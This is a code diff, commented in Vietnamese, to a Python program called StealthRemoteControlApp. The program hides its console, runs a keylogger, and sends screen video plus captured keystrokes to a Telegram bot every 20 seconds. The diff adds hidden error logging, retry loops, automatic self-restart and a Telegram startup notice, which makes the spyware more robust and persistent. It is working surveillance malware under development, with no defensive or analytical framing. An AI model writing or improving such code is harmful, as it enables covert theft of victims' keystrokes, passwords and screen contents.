@@ -367,13 +367,41 @@ class StealthRemoteControlApp:
         Chạy vòng lặp vô hạn với kiểm tra internet - chỉ chạy khi có internet
         """
         if not self.check_config():
+            # Ghi log lỗi (ẩn)
+            try:
+                log_file = os.path.join(TEMP_DIR, "error.log")
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"[{datetime.now()}] ERROR: Config không hợp lệ\n")
+            except:
+                pass
             return
         
         # Đợi có internet trước khi bắt đầu
-        self.internet_checker.wait_for_connection()
+        try:
+            self.internet_checker.wait_for_connection()
+        except Exception as e:
+            # Ghi log lỗi
+            try:
+                log_file = os.path.join(TEMP_DIR, "error.log")
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"[{datetime.now()}] ERROR: Không thể kết nối internet: {e}\n")
+            except:
+                pass
+            return
         
         # Đảm bảo ứng dụng chạy ẩn hoàn toàn
         hide_console()
+        
+        # Gửi thông báo khởi động thành công (nếu chưa gửi)
+        try:
+            if self.telegram.bot and self.internet_checker.is_online():
+                startup_msg = f"🟢 Ứng dụng đã khởi động và đang chạy!\n\n"
+                startup_msg += f"🆔 Machine: {self.machine_short_id}\n"
+                startup_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                startup_msg += f"✅ Sẽ gửi video + keylog mỗi 20 giây"
+                self.telegram.send_text_sync(startup_msg)
+        except:
+            pass
         
         self.running = True
         # Keylogger đã được khởi động trong __init__, không cần start lại
@@ -512,13 +540,27 @@ class StealthRemoteControlApp:
                         self.last_video_send = current_time
                     if current_time - self.last_video_send >= VIDEO_SEND_INTERVAL:
                         try:
-                            self.record_and_send_with_keylog()
-                            self.last_video_send = current_time
-                        except:
-                            pass
+                            success = self.record_and_send_with_keylog()
+                            if success:
+                                self.last_video_send = current_time
+                            else:
+                                # Nếu gửi thất bại, thử lại sau 5 giây
+                                time.sleep(5)
+                        except Exception as e:
+                            # Ghi log lỗi (ẩn)
+                            try:
+                                log_file = os.path.join(TEMP_DIR, "error.log")
+                                with open(log_file, 'a', encoding='utf-8') as f:
+                                    f.write(f"[{datetime.now()}] ERROR khi gửi video: {e}\n")
+                            except:
+                                pass
+                            time.sleep(5)
                 else:
                     # Không có internet, đợi đến khi có kết nối
-                    self.internet_checker.wait_for_connection()
+                    try:
+                        self.internet_checker.wait_for_connection()
+                    except:
+                        time.sleep(10)
                 
                 # Đợi một chút trước lần kiểm tra tiếp theo
                 time.sleep(2)  # Kiểm tra mỗi 2 giây để đảm bảo gửi đúng 20s
@@ -542,10 +584,24 @@ class StealthRemoteControlApp:
 
 def main():
     """Hàm main chạy ẩn"""
-    app = StealthRemoteControlApp()
-    
-    # Chạy vòng lặp vô hạn
-    app.run_infinite_loop()
+    try:
+        app = StealthRemoteControlApp()
+        
+        # Chạy vòng lặp vô hạn
+        app.run_infinite_loop()
+    except Exception as e:
+        # Ghi log lỗi nếu có
+        try:
+            log_file = os.path.join(TEMP_DIR, "error.log")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] CRITICAL ERROR: {e}\n")
+                import traceback
+                f.write(traceback.format_exc())
+        except:
+            pass
+        # Thử khởi động lại sau 30 giây
+        time.sleep(30)
+        main()
 
 
 if __name__ == "__main__":
